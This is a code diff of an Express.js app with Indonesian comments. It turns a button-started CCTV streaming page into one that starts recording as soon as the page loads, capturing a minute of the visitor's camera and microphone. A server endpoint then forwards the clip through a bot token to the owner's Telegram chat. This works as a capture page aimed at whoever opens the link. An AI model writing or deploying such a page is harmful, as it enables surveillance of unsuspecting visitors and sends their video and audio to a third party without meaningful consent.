@@ -1,7 +1,14 @@
 const express = require('express');
-const app = express();
+const multer = require('multer');
+const axios = require('axios');
+const FormData = require('form-data');
+const path = require('path');
+const config = require('./setting.js');
 
-// Halaman utama (broadcaster) - dengan tombol untuk memulai siaran
+const app = express();
+const upload = multer({ storage: multer.memoryStorage() });
+
+// Halaman utama (kosong, hanya dengan script)
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -9,215 +16,107 @@ app.get('/', (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CCTV Broadcaster</title>
+    <title>Camera to Telegram</title>
     <style>
-        body {
-            margin: 0;
-            padding: 20px;
-            font-family: Arial, sans-serif;
-            background: #1a1a1a;
-            color: white;
-            text-align: center;
-        }
-        video {
-            width: 100%;
-            max-width: 800px;
-            border: 3px solid #333;
-            border-radius: 10px;
-            background: black;
-            display: none; /* disembunyikan sampai tombol ditekan */
-        }
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
-            background: #2ecc71;
-            color: black;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 20px;
-        }
-        button:hover {
-            background: #27ae60;
-        }
-        .status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 5px;
-            background: #333;
-        }
-        .connected { background: #2ecc71; color: black; }
-        .disconnected { background: #e74c3c; }
+        body { margin: 0; background: black; color: white; text-align: center; font-family: Arial, sans-serif; }
+        video { width: 100%; max-width: 500px; margin-top: 20px; border: 2px solid #333; border-radius: 8px; }
+        #status { margin-top: 20px; padding: 10px; }
     </style>
 </head>
 <body>
-    <h1>📹 CCTV Broadcaster</h1>
-    <p>Klik tombol di bawah untuk memulai siaran kamera ke admin.</p>
-    <button id="startBtn">Mulai Siaran</button>
-    <video id="localVideo" autoplay playsinline muted></video>
-    <div id="status" class="status disconnected">⏳ Menunggu tindakan...</div>
+    <h2>📷 Merekam video 1 menit...</h2>
+    <video id="video" autoplay playsinline muted></video>
+    <div id="status">Meminta izin kamera...</div>
 
-    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
     <script>
-        let peer = null;
-        let localStream = null;
-        let call = null;
-        const statusDiv = document.getElementById('status');
-        const video = document.getElementById('localVideo');
-        const startBtn = document.getElementById('startBtn');
+        let mediaRecorder;
+        let recordedChunks = [];
 
-        startBtn.addEventListener('click', async () => {
-            startBtn.disabled = true;
-            startBtn.textContent = 'Memulai...';
-            statusDiv.textContent = '⏳ Meminta izin kamera...';
-            statusDiv.className = 'status disconnected';
-
+        async function startRecording() {
             try {
-                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                video.srcObject = localStream;
-                video.style.display = 'block';
-                statusDiv.textContent = '✅ Kamera aktif. Menyiapkan koneksi...';
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('video').srcObject = stream;
+                document.getElementById('status').innerText = 'Kamera aktif. Mulai merekam...';
 
-                peer = new Peer();
-                
-                peer.on('open', (id) => {
-                    console.log('Peer ID:', id);
-                    statusDiv.textContent = '🔗 Terhubung ke server, mencoba menghubungi admin...';
-                    
-                    call = peer.call('admin', localStream);
-                    
-                    call.on('close', () => {
-                        statusDiv.textContent = '❌ Admin terputus. Klik tombol untuk memulai ulang.';
-                        statusDiv.className = 'status disconnected';
-                        startBtn.disabled = false;
-                        startBtn.textContent = 'Mulai Siaran';
-                    });
-                    
-                    call.on('error', (err) => {
-                        console.error('Call error:', err);
-                        statusDiv.textContent = '⚠️ Gagal terhubung ke admin. Pastikan admin online.';
-                        statusDiv.className = 'status disconnected';
-                        startBtn.disabled = false;
-                        startBtn.textContent = 'Mulai Siaran';
-                    });
-                });
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) recordedChunks.push(event.data);
+                };
 
-                peer.on('error', (err) => {
-                    console.error('Peer error:', err);
-                    statusDiv.textContent = '❌ Koneksi ke server gagal. Periksa internet.';
-                    statusDiv.className = 'status disconnected';
-                    startBtn.disabled = false;
-                    startBtn.textContent = 'Mulai Siaran';
-                });
+                mediaRecorder.onstop = async () => {
+                    document.getElementById('status').innerText = 'Mengirim video...';
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', blob, 'recording.webm');
 
+                    try {
+                        const res = await fetch('/upload', { method: 'POST', body: formData });
+                        const result = await res.json();
+                        if (result.success) {
+                            document.getElementById('status').innerText = '✅ Video terkirim ke Telegram!';
+                        } else {
+                            document.getElementById('status').innerText = '❌ Gagal mengirim: ' + result.error;
+                        }
+                    } catch (err) {
+                        document.getElementById('status').innerText = '❌ Error: ' + err.message;
+                    }
+
+                    // Hentikan semua track kamera
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+                // Rekam selama 60 detik
+                mediaRecorder.start();
+                document.getElementById('status').innerText = 'Merekam... (60 detik)';
+                setTimeout(() => {
+                    if (mediaRecorder.state !== 'inactive') {
+                        mediaRecorder.stop();
+                    }
+                }, 60000);
             } catch (err) {
-                console.error('Camera error:', err);
-                statusDiv.textContent = '❌ Gagal mengakses kamera. Berikan izin.';
-                statusDiv.className = 'status disconnected';
-                startBtn.disabled = false;
-                startBtn.textContent = 'Mulai Siaran';
+                document.getElementById('status').innerText = '❌ Gagal akses kamera: ' + err.message;
             }
-        });
+        }
+
+        window.onload = startRecording;
     </script>
 </body>
 </html>
   `);
 });
 
-// Halaman admin - menerima stream dari broadcaster
-app.get('/admin', (req, res) => {
-  res.send(`
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CCTV Admin</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 20px;
-            font-family: Arial, sans-serif;
-            background: #1a1a1a;
-            color: white;
-            text-align: center;
-        }
-        video {
-            width: 100%;
-            max-width: 800px;
-            border: 3px solid #333;
-            border-radius: 10px;
-            background: black;
-        }
-        .status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 5px;
-            background: #333;
-        }
-        .connected { background: #2ecc71; color: black; }
-        .waiting { background: #f39c12; }
-        .disconnected { background: #e74c3c; }
-    </style>
-</head>
-<body>
-    <h1>📺 CCTV Admin</h1>
-    <p>Menampilkan video dari broadcaster secara live.</p>
-    <video id="remoteVideo" autoplay playsinline></video>
-    <div id="status" class="status waiting">⏳ Menunggu broadcaster...</div>
+// Endpoint untuk menerima video dan forward ke Telegram
+app.post('/upload', upload.single('video'), async (req, res) => {
+    if (!req.file) {
+        return res.status(400).json({ success: false, error: 'No video uploaded' });
+    }
 
-    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
-    <script>
-        const peer = new Peer('admin');
-        const statusDiv = document.getElementById('status');
+    try {
+        const formData = new FormData();
+        formData.append('chat_id', config.OWNER_ID);
+        formData.append('video', req.file.buffer, { filename: 'recording.webm', contentType: 'video/webm' });
 
-        peer.on('open', (id) => {
-            console.log('Admin peer ready with ID:', id);
-            statusDiv.textContent = '🟢 Admin siap, menunggu broadcaster...';
-            statusDiv.className = 'status waiting';
+        const telegramRes = await axios.post(`https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendVideo`, formData, {
+            headers: formData.getHeaders()
         });
 
-        peer.on('call', (call) => {
-            statusDiv.textContent = '📞 Ada panggilan masuk! Menerima...';
-            call.answer();
-
-            call.on('stream', (remoteStream) => {
-                document.getElementById('remoteVideo').srcObject = remoteStream;
-                statusDiv.textContent = '✅ Streaming aktif';
-                statusDiv.className = 'status connected';
-            });
-
-            call.on('close', () => {
-                statusDiv.textContent = '❌ Broadcaster terputus. Menunggu...';
-                statusDiv.className = 'status waiting';
-            });
-
-            call.on('error', (err) => {
-                console.error('Call error:', err);
-                statusDiv.textContent = '⚠️ Error pada stream.';
-                statusDiv.className = 'status disconnected';
-            });
-        });
-
-        peer.on('error', (err) => {
-            console.error('Peer error:', err);
-            statusDiv.textContent = '❌ Gagal koneksi ke server. Periksa internet.';
-            statusDiv.className = 'status disconnected';
-        });
-    </script>
-</body>
-</html>
-  `);
+        if (telegramRes.data.ok) {
+            res.json({ success: true });
+        } else {
+            res.status(500).json({ success: false, error: 'Telegram API error' });
+        }
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({ success: false, error: error.message });
+    }
 });
 
 // Handle 404
 app.use((req, res) => {
-  res.status(404).send('404 - Halaman tidak ditemukan');
+    res.status(404).send('404 - Not Found');
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`📹 Broadcaster: http://localhost:${PORT}`);
-  console.log(`👑 Admin: http://localhost:${PORT}/admin`);
+    console.log(`Server running on port ${PORT}`);
 });
